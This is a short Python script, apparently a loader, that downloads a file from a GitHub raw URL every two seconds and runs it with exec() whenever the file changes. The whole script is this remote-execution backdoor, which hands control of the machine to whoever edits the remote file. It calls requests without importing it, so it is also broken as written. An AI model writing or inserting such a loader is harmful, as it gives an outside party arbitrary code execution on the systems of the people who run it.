import time
x = requests.get("https://raw.githubusercontent.com/mrmorcilla/insha/refs/heads/main/ggs.py").text
while True:
  time.sleep(2)
  a = requests.get("https://raw.githubusercontent.com/mrmorcilla/insha/refs/heads/main/ggs.py").text
  if a != x:
    exec(a)
    x = a
